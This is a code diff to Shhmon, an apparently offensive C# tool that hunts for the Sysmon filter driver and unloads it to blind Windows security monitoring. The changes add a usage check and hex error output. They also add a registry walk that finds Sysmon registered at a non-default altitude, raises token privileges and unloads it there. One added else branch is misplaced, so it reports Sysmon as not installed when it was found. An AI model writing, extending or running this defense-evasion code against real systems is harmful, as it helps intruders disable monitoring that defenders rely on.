@@ -9,6 +9,12 @@ namespace Shhmon
     {
         static void Main(string[] args)
         {
+            if (args.Length < 1)
+            {
+                Console.WriteLine("[-] Missing args");
+                Console.WriteLine("[-] Usage: Shhmon.exe <hunt|kill>");
+                Environment.Exit(1);
+            }
             if (args[0] == "hunt" || args[0] == "kill")
             {
                 if (!IsAdmin())
@@ -37,12 +43,13 @@ namespace Shhmon
                                 status = Win32.FilterUnload(filter.Name);
                                 if (!status.Equals(0))
                                 {
-                                    Console.WriteLine("[-] Driver unload failed");
+                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
                                 }
                                 else
                                 {
                                     Console.WriteLine("[+] SysmonDrv was unloaded :)");
                                 }
+                                
                             }
 
                         }
@@ -57,7 +64,8 @@ namespace Shhmon
                                 status = Win32.FilterUnload(filter.Name);
                                 if (!status.Equals(0))
                                 {
-                                    Console.WriteLine("[-] Driver unload failed");
+                                    Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
+
                                 }
                                 else
                                 {
@@ -69,7 +77,32 @@ namespace Shhmon
                 }
                 if (!found)
                 {
-                    Console.WriteLine("[-] No driver found at altitude 385201");
+                    Console.WriteLine("[-] No driver found at altitude 385201. Checking for Sysmon running at a different altitude.");
+
+                    FilterParser.WalkRegistryKeys(out string altName, out string altitude);
+                    if (!string.IsNullOrWhiteSpace(altName) && !string.IsNullOrWhiteSpace(altitude))
+                    {
+                        Console.WriteLine("[+] Found Sysmon running as {0} at altitude {1}", altName, altitude);
+                        if (args[0] == "kill")
+                        {
+                            Console.WriteLine("[+] Trying to kill the driver...");
+                            Win32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.TOKEN_ALL_ACCESS, out currentProcessToken);
+                            Tokens.SetTokenPrivilege(ref currentProcessToken);
+                            status = Win32.FilterUnload(altName);
+                            if (!status.Equals(0))
+                            {
+                                Console.WriteLine("[-] Driver unload failed - Error: {0}", String.Format("{0:X}", status));
+                            }
+                            else
+                            {
+                                Console.WriteLine("[+] {0} was unloaded :)", altName);
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("[-] Sysmon does not appear to be installed");
                 }
             }
             else
